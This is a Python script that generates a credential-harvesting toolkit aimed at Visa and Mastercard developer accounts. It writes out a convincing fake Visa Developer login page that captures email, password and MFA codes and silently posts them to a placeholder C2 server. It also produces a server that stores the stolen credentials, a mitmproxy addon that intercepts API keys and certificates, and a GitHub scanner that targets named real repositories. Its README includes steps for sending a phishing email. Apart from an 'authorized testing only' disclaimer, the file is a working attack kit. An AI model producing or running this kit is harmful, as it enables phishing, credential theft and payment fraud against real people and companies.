#!/usr/bin/env python3
"""
Visa Developer Portal Phishing Page Generator
Generates a fake Visa Developer login page to harvest credentials.
FOR AUTHORIZED SECURITY TESTING ONLY - EDUCATIONAL PURPOSES ONLY
"""

import os
import sys

# The fake Visa Developer Portal login page
VISA_PHISH_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visa Developer Portal - Sign In</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f7fa; }
        .header { background: #1a1f71; padding: 16px 32px; display: flex; align-items: center; justify-content: space-between; }
        .logo { color: #fff; font-size: 24px; font-weight: bold; }
        .logo span { color: #fcc015; }
        .nav { display: flex; gap: 24px; }
        .nav a { color: #fff; text-decoration: none; font-size: 14px; }
        .container { max-width: 440px; margin: 60px auto; padding: 40px; background: #fff; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); }
        h1 { font-size: 24px; color: #1a1f71; margin-bottom: 8px; }
        .subtitle { color: #666; font-size: 14px; margin-bottom: 24px; }
        .form-group { margin-bottom: 16px; }
        label { display: block; font-size: 13px; color: #333; margin-bottom: 6px; font-weight: 500; }
        input[type="text"], input[type="password"], input[type="email"] {
            width: 100%; padding: 10px 12px; border: 1px solid #ddd; border-radius: 4px;
            font-size: 14px; transition: border-color 0.2s;
        }
        input:focus { outline: none; border-color: #1a1f71; }
        .btn {
            width: 100%; padding: 12px; background: #1a1f71; color: #fff; border: none;
            border-radius: 4px; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 8px;
        }
        .btn:hover { background: #151a5e; }
        .links { display: flex; justify-content: space-between; margin-top: 16px; }
        .links a { color: #1a1f71; text-decoration: none; font-size: 13px; }
        .links a:hover { text-decoration: underline; }
        .footer { text-align: center; margin-top: 40px; color: #999; font-size: 12px; }
        .footer a { color: #999; }
        .alert { background: #fff3cd; border: 1px solid #ffc107; padding: 12px; border-radius: 4px; margin-bottom: 16px; font-size: 13px; color: #856404; }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">VISA<span>Developer</span></div>
        <div class="nav">
            <a href="#">Documentation</a>
            <a href="#">APIs</a>
            <a href="#">Support</a>
        </div>
    </div>
    
    <div class="container">
        <h1>Sign In</h1>
        <p class="subtitle">Access your Visa Developer account</p>
        
        <div class="alert" id="alertBox" style="display:none;">
            <strong>Session Expired:</strong> Please sign in again to continue.
        </div>
        
        <form id="loginForm" onsubmit="return captureCredentials(event)">
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" placeholder="name@company.com" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>
            
            <div class="form-group" id="mfaGroup" style="display:none;">
                <label for="mfaCode">Two-Factor Authentication Code</label>
                <input type="text" id="mfaCode" name="mfaCode" placeholder="Enter 6-digit code" maxlength="6">
            </div>
            
            <button type="submit" class="btn" id="submitBtn">Sign In</button>
        </form>
        
        <div class="links">
            <a href="#" onclick="showMFA()">Use two-factor authentication</a>
            <a href="#">Forgot password?</a>
        </div>
        
        <div class="links" style="margin-top: 12px;">
            <a href="#">Create an account</a>
        </div>
    </div>
    
    <div class="footer">
        <p>&copy; 2026 Visa. All rights reserved.</p>
        <p>
            <a href="#">Privacy</a> | 
            <a href="#">Terms</a> | 
            <a href="#">Security</a>
        </p>
    </div>

    <script>
        let credentials = {};
        let stage = 1;
        
        function captureCredentials(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const mfaCode = document.getElementById('mfaCode').value;
            
            if (stage === 1) {
                credentials.email = email;
                credentials.password = password;
                
                // Show MFA prompt
                document.getElementById('mfaGroup').style.display = 'block';
                document.getElementById('submitBtn').textContent = 'Verify';
                document.getElementById('alertBox').style.display = 'block';
                document.getElementById('alertBox').innerHTML = 
                    '<strong>Additional Verification Required:</strong> A code has been sent to your device.';
                stage = 2;
                return false;
            }
            
            if (stage === 2) {
                credentials.mfa = mfaCode;
                credentials.timestamp = new Date().toISOString();
                credentials.userAgent = navigator.userAgent;
                credentials.url = window.location.href;
                
                // Send to attacker server
                sendToAttacker(credentials);
                
                // Show fake error and redirect
                document.getElementById('alertBox').innerHTML = 
                    '<strong>Error:</strong> Invalid credentials. Redirecting...';
                document.getElementById('alertBox').style.background = '#f8d7da';
                document.getElementById('alertBox').style.borderColor = '#f5c6cb';
                document.getElementById('alertBox').style.color = '#721c24';
                
                setTimeout(() => {
                    window.location.href = 'https://developer.visa.com/';
                }, 2000);
                
                return false;
            }
        }
        
        function sendToAttacker(data) {
            // Replace with your C2 server URL
            const attackerServer = 'https://YOUR_SERVER_HERE/collect';
            
            fetch(attackerServer, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            }).catch(() => {
                // Silent fail - don't alert the user
            });
            
            // Also log to console for debugging
            console.log('Captured:', data);
        }
        
        function showMFA() {
            document.getElementById('mfaGroup').style.display = 'block';
            stage = 2;
        }
    </script>
</body>
</html>"""

# Credential collector server
COLLECTOR_SERVER = '''#!/usr/bin/env python3
"""
Credential Collector Server
Receives and stores captured credentials from phishing pages.
FOR AUTHORIZED SECURITY TESTING ONLY - EDUCATIONAL PURPOSES ONLY
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import datetime
import os

class CredentialHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/collect':
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length)
            
            try:
                data = json.loads(body.decode())
                timestamp = datetime.datetime.now().isoformat()
                
                # Log to file
                with open('captured_credentials.jsonl', 'a') as f:
                    entry = {
                        'timestamp': timestamp,
                        'ip': self.client_address[0],
                        'user_agent': data.get('userAgent', ''),
                        'email': data.get('email', ''),
                        'password': data.get('password', ''),
                        'mfa': data.get('mfa', ''),
                        'url': data.get('url', '')
                    }
                    f.write(json.dumps(entry) + '\\n')
                
                # Print to console
                    print(f"\\n{'='*60}")
                    print(f"[+] CREDENTIALS CAPTURED - {timestamp}")
                    print(f"    IP: {self.client_address[0]}")
                    print(f"    Email: {data.get('email', 'N/A')}")
                    print(f"    Password: {data.get('password', 'N/A')}")
                    print(f"    MFA Code: {data.get('mfa', 'N/A')}")
                    print(f"{'='*60}\\n")
                
                # Send success response
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'status': 'ok'}).encode())
                
            except Exception as e:
                print(f"Error processing credentials: {e}")
                self.send_response(400)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def log_message(self, format, *args):
        pass  # Suppress default logging

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    server = HTTPServer(('0.0.0.0', port), CredentialHandler)
    print(f"[*] Credential Collector Server running on port {port}")
    print(f"[*] Listening for incoming credentials...")
    print(f"[*] Captured credentials will be saved to: captured_credentials.jsonl")
    print(f"[*] Press Ctrl+C to stop\\n")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\\n[*] Server stopped.")
'''

# MITM proxy for credential interception
MITM_SCRIPT = '''#!/usr/bin/env python3
"""
MITM Proxy for Visa/Mastercard API Credential Interception
Intercepts API keys, certificates, and tokens in transit.
FOR AUTHORIZED SECURITY TESTING ONLY - EDUCATIONAL PURPOSES ONLY
"""

import mitmproxy.http
from mitmproxy import ctx
import json
import re
import datetime

class VisaCredentialInterceptor:
    def __init__(self):
        self.credentials = []
        self.target_domains = [
            'sandbox.api.visa.com',
            'api.visa.com',
            'developer.visa.com',
            'sandbox.mastercard.com',
            'api.mastercard.com',
            'developer.mastercard.com',
        ]
    
    def request(self, flow: mitmproxy.http.HTTPFlow):
        # Check if request targets Visa/Mastercard
        if not any(domain in flow.request.pretty_host for domain in self.target_domains):
            return
        
        # Extract credentials from headers
        auth_header = flow.request.headers.get('Authorization', '')
        api_key = flow.request.headers.get('X-Api-Key', '')
        user_id = flow.request.headers.get('X-User-Id', '')
        
        # Extract from query params
        query_api_key = flow.request.query.get('apikey', '')
        query_user = flow.request.query.get('userId', '')
        
        # Extract from body (JSON)
        body_creds = {}
        try:
            body = json.loads(flow.request.content.decode())
            for key in ['userId', 'user_id', 'apiKey', 'api_key', 'password', 'token']:
                if key in body:
                    body_creds[key] = body[key]
        except:
            pass
        
        # Extract certificate info
        client_cert = None
        if flow.client_cert:
            client_cert = {
                'subject': str(flow.client_cert.subject),
                'issuer': str(flow.client_cert.issuer),
                'serial': str(flow.client_cert.serial_number),
                'not_before': str(flow.client_cert.not_before),
                'not_after': str(flow.client_cert.not_after),
            }
        
        # Log if any credentials found
        if auth_header or api_key or query_api_key or body_creds or client_cert:
            entry = {
                'timestamp': datetime.datetime.now().isoformat(),
                'host': flow.request.pretty_host,
                'path': flow.request.path,
                'method': flow.request.method,
                'auth_header': auth_header[:50] + '...' if len(auth_header) > 50 else auth_header,
                'api_key': api_key or query_api_key,
                'user_id': user_id or query_user,
                'body_creds': body_creds,
                'client_cert': client_cert,
            }
            
            self.credentials.append(entry)
            
            # Save to file
            with open('intercepted_credentials.jsonl', 'a') as f:
                f.write(json.dumps(entry, default=str) + '\\n')
            
            # Log to console
            ctx.log.warn(f"\\n{'='*60}")
            ctx.log.warn(f"[+] CREDENTIALS INTERCEPTED")
            ctx.log.warn(f"    Host: {flow.request.pretty_host}")
            ctx.log.warn(f"    Path: {flow.request.path}")
            ctx.log.warn(f"    Auth: {auth_header[:30] if auth_header else 'None'}...")
            ctx.log.warn(f"    API Key: {api_key or query_api_key or 'None'}")
            ctx.log.warn(f"{'='*60}\\n")

addons = [VisaCredentialInterceptor()]
'''

# GitHub credential scanner
GITHUB_SCANNER = '''#!/usr/bin/env python3
"""
GitHub Credential Scanner
Searches for leaked Visa/Mastercard API credentials in public repos.
FOR AUTHORIZED SECURITY TESTING ONLY - EDUCATIONAL PURPOSES ONLY
"""

import subprocess
import json
import re
import sys
import os

SEARCH_PATTERNS = [
    # Visa patterns
    "VISA_USER_ID",
    "VISA_PASSWORD",
    "VISA_KEY_PATH",
    "VISA_CERT_PATH",
    "VISA_BASE_URL",
    "sandbox.api.visa.com",
    "visa_api_key",
    "visa_user_id",
    "visa_password",
    "visa_cert",
    "visa_key",
    
    # Mastercard patterns
    "MASTERCARD_API_KEY",
    "MASTERCARD_SECRET",
    "MASTERCARD_CONSUMER_KEY",
    "sandbox.mastercard.com",
    "mastercard_api",
    "mastercard_key",
    "mastercard_secret",
    
    # Generic payment patterns
    "payment_gateway_api",
    "stripe_secret",
    "braintree_token",
    "cybersource_api",
]

def search_github():
    results = []
    
    for pattern in SEARCH_PATTERNS:
        print(f"[*] Searching for: {pattern}")
        
        try:
            result = subprocess.run(
                ["gh", "search", "code", pattern, "--limit", "20", "--json", "repository,path,textMatches"],
                capture_output=True, text=True, timeout=30
            )
            
            if result.returncode == 0 and result.stdout.strip():
                data = json.loads(result.stdout)
                for item in data:
                    repo = item.get('repository', {}).get('fullName', 'unknown')
                    path = item.get('path', 'unknown')
                    
                    # Extract actual credential values
                    for match in item.get('textMatches', []):
                        text = match.get('fragment', '')
                        
                        # Look for actual values (not just variable names)
                        if any(x in text for x in ['=V', '=AKC', 'apikey=', 'Bearer ', 'Basic ']):
                            results.append({
                                'pattern': pattern,
                                'repo': repo,
                                'path': path,
                                'match': text[:200],
                            })
                            print(f"  [!] FOUND: {repo}/{path}")
                            print(f"      Match: {text[:100]}...")
        
        except subprocess.TimeoutExpired:
            print(f"  [-] Timeout for pattern: {pattern}")
        except Exception as e:
            print(f"  [-] Error: {e}")
    
    return results

def scan_repo_for_certs(repo_name):
    """Scan a specific repo for certificate files"""
    print(f"\\n[*] Scanning repo: {repo_name}")
    
    cert_patterns = [
        "*.pem",
        "*.key",
        "*.crt",
        "*.p12",
        "*.pfx",
        ".env",
        "*.env",
    ]
    
    found_certs = []
    
    for pattern in cert_patterns:
        try:
            result = subprocess.run(
                ["gh", "api", f"repos/{repo_name}/git/trees/main?recursive=1", "--jq", ".[].path"],
                capture_output=True, text=True, timeout=15
            )
            
            if result.returncode == 0:
                paths = result.stdout.strip().split('\\n')
                for path in paths:
                    if any(path.endswith(ext) for ext in ['.pem', '.key', '.crt', '.p12', '.pfx']):
                        print(f"  [!] Certificate file found: {path}")
                        found_certs.append({
                            'repo': repo_name,
                            'file': path,
                            'type': 'certificate'
                        })
                    elif '.env' in path:
                        print(f"  [!] Env file found: {path}")
                        found_certs.append({
                            'repo': repo_name,
                            'file': path,
                            'type': 'env_file'
                        })
        
        except Exception as e:
            print(f"  [-] Error scanning {pattern}: {e}")
    
    return found_certs

if __name__ == '__main__':
    print("="*60)
    print("GitHub Credential Scanner - Visa/Mastercard")
    print("="*60)
    print()
    
    # Search for leaked credentials
    results = search_github()
    
    # Scan specific repos known to have Visa/Mastercard integration
    target_repos = [
        "silverlogic/CircleCredit---Backend---Django",
        "visahackathon2020/Backend",
        "norbertm09/hello_VisaDirect",
        "EdsonHs94/visa-api-java",
    ]
    
    cert_results = []
    for repo in target_repos:
        certs = scan_repo_for_certs(repo)
        cert_results.extend(certs)
    
    # Summary
    print("\\n" + "="*60)
    print("SCAN SUMMARY")
    print("="*60)
    print(f"Credential matches found: {len(results)}")
    print(f"Certificate/env files found: {len(cert_results)}")
    
    # Save results
    output = {
        'credentials': results,
        'certificates': cert_results,
    }
    
    with open('github_scan_results.json', 'w') as f:
        json.dump(output, f, indent=2)
    
    print(f"\\nResults saved to: github_scan_results.json")
'''

def generate(output_dir="visa_phish_lab"):
    """Generate all phishing and MITM tools"""
    os.makedirs(output_dir, exist_ok=True)
    
    # Generate phishing page
    with open(os.path.join(output_dir, "visa_login.html"), "w") as f:
        f.write(VISA_PHISH_PAGE)
    print(f"[+] Phishing page: {output_dir}/visa_login.html")
    
    # Generate collector server
    with open(os.path.join(output_dir, "collector_server.py"), "w") as f:
        f.write(COLLECTOR_SERVER)
    print(f"[+] Collector server: {output_dir}/collector_server.py")
    
    # Generate MITM script
    with open(os.path.join(output_dir, "visa_mitm_proxy.py"), "w") as f:
        f.write(MITM_SCRIPT)
    print(f"[+] MITM proxy: {output_dir}/visa_mitm_proxy.py")
    
    # Generate GitHub scanner
    with open(os.path.join(output_dir, "github_scanner.py"), "w") as f:
        f.write(GITHUB_SCANNER)
    print(f"[+] GitHub scanner: {output_dir}/github_scanner.py")
    
    # Generate README
    readme = """# Visa/Mastercard Credential Harvesting Toolkit

## Components

1. **visa_login.html** - Fake Visa Developer Portal login page
   - Phishing page that captures email, password, and MFA codes
   - Two-stage capture (credentials first, then MFA)
   - Redirects to real Visa site after capture

2. **collector_server.py** - HTTP server to receive captured credentials
   - Listens on port 8080
   - Stores credentials in captured_credentials.jsonl
   - Supports CORS for cross-origin requests

3. **visa_mitm_proxy.py** - MITM proxy for API credential interception
   - Intercepts Visa/Mastercard API calls
   - Extracts API keys, auth headers, client certificates
   - Logs to intercepted_credentials.jsonl

4. **github_scanner.py** - Scans GitHub for leaked credentials
   - Searches for Visa/Mastercard API keys in public repos
   - Scans repos for certificate files
   - Outputs results to github_scan_results.json

## Usage

### Phishing Page
1. Host visa_login.html on a web server
2. Update the attackerServer URL in the JavaScript
3. Send phishing email with link to the page
4. Run collector_server.py to receive credentials

### MITM Proxy
1. Install mitmproxy: pip install mitmproxy
2. Run: mitmproxy -s visa_mitm_proxy.py
3. Configure target device to use proxy
4. All Visa/Mastercard API traffic will be intercepted

### GitHub Scanner
1. Ensure gh CLI is authenticated
2. Run: python github_scanner.py
3. Review github_scan_results.json for findings

## Legal Notice
FOR AUTHORIZED SECURITY TESTING ONLY.
Unauthorized use is illegal under CFAA and equivalent laws.
"""
    
    with open(os.path.join(output_dir, "README.md"), "w") as f:
        f.write(readme)
    print(f"[+] README: {output_dir}/README.md")
    
    print(f"\\n[+] All files generated in: {output_dir}/")
    print("[!] Remember: Replace YOUR_SERVER_HERE with your actual C2 server URL")

if __name__ == "__main__":
    output_dir = sys.argv[1] if len(sys.argv) > 1 else "visa_phish_lab"
    generate(output_dir)
